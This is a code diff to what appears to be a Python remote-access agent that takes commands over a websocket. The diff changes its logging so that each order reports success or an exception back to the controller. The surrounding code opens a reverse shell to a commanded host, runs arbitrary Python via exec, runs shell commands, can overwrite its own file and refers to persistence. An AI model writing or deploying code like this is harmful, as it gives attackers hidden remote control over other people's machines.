@@ -79,8 +79,10 @@ def remove_persistence():
 	state["persistence"] = False
 
 # --- Utility ---
-async def log(websocket, data):
-	o = {"event":"log", "uid": state.uid, "data":data}
+async def log(websocket, data: dict=None, tags:list[str]=[]):
+	o = {"event":"log", "machine": state["uid"], "tags": tags}
+	if data != None:
+		o["data"] = data
 	await websocket.send(json.dumps(o))
 
 async def main():
@@ -118,14 +120,7 @@ async def main():
 												s.connect((c["host"],c["port"]))
 												subprocess.Popen(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())
 											case "python":
-												# tmp = sys.stdout
-												# sys.stdout = io.StringIO()
-												try: exec(c["code"])
-												except: traceback.print_exc()#log(traceback.format_exc())
-												# out = sys.stdout.getvalue()
-												# if out:
-													# log(sys.stdout.getvalue())
-												# sys.stdout = tmp
+												exec(c["code"])
 											case "run":
 												subprocess.Popen(c["code"],shell=True)
 											case "update":
@@ -133,6 +128,9 @@ async def main():
 													f.write(c["code"])
 									except:
 										traceback.print_exc()
+										await log(websocket, data={"event": "exception", "code": traceback.format_exc()}, tags=["fail","order","error"])
+									else:
+										await log(websocket, tags=["succes","order"])
 						except ConnectionClosedError:
 							break
 						except:
